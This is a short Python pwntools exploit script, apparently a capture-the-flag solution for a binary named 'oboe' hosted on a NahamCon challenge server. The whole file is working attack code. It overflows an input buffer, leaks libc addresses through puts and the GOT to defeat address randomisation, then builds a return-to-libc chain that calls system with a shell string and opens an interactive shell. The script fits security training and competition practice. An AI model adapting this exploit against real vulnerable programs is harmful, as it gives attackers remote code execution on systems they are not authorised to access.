from pwn import *

context.binary = exe = ELF('./oboe')
libc = ELF('./libc.so')

#io = process()
io = remote('challenge.nahamcon.com', 30557)

io.recvuntil(b'protocol:\n')
io.sendline(b'i'*64)
io.recvuntil(b'domain:\n')
io.sendline(b'i'*64)
io.recvuntil(b'path:\n')
payload = b'i'*13 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['getchar'])
payload += b'i'*(60-len(payload))
io.sendline(payload)

io.recvuntil(b'i\n')
getchar = u32(io.recv(4))
strcat = u32(io.recv(4))
puts = u32(io.recv(4))
libc.address = puts - libc.sym['puts']
log.info(f'getchar: {hex(getchar)}\nstrcat: {hex(strcat)}\nputs: {hex(puts)}')
log.info(f'Libc base: {hex(libc.address)}')

io.recvuntil(b'protocol:\n')
io.sendline(b'i'*64)
io.recvuntil(b'domain:\n')
io.sendline(b'i'*64)
io.recvuntil(b'path:\n')
payload = b'i'*13 + p32(libc.sym['system']) + p32(exe.sym['main']) + p32(libc.address + 0x17b9db)
payload += b'i'*(60-len(payload))
io.sendline(payload)

io.interactive()